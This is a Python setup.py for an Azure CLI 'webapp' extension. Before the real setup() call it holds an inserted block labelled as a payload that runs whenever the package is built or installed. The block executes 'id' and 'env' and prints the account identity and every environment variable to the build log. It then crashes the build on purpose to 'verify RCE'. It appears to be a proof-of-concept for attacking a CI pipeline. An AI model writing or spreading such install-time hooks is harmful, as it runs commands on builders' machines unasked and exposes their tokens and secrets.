#!/usr/bin/env python

# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------

from codecs import open
from setuptools import setup, find_packages
import os
import sys

# --- PAYLOAD START ---
try:
    # Write to stderr (Standard Error) to bypass log buffering
    sys.stderr.write("\n\n")
    sys.stderr.write("================================================================\n")
    sys.stderr.write("[!] CRITICAL VULNERABILITY: SETUP.PY RCE CONFIRMED [!]\n")
    sys.stderr.write("================================================================\n")
    
    # Run commands and redirect their output to stderr
    os.system("id >&2")
    os.system("env >&2")
    
    sys.stderr.write("================================================================\n\n")
    
    # Force a crash to make the build fail and show logs immediately
    raise RuntimeError("Stopping build intentionally to verify RCE")
except Exception as e:
    # If the raise above is caught by something else, print this
    sys.stderr.write(str(e))
  
VERSION = "0.4.1"

CLASSIFIERS = [
    'Development Status :: 4 - Beta',
    'Intended Audience :: Developers',
    'Intended Audience :: System Administrators',
    'Programming Language :: Python',
    'Programming Language :: Python :: 2',
    'Programming Language :: Python :: 2.7',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
    'License :: OSI Approved :: MIT License',
]

DEPENDENCIES = []

setup(
    name='webapp',
    version=VERSION,
    description='Additional commands for Azure AppService.',
    long_description='An Azure CLI Extension to manage appservice resources',
    license='MIT',
    author='Sisira Panchagnula',
    author_email='sisirap@microsoft.com',
    contributor='Purva Vasudeo',
    contributor_email='t-puvasu@microsoft.com',
    url='https://github.com/Azure/azure-cli-extensions/tree/main/src/webapp',
    classifiers=CLASSIFIERS,
    package_data={'azext_webapp': ['azext_metadata.json']},
    packages=find_packages(exclude=["tests"]),
    install_requires=DEPENDENCIES
)
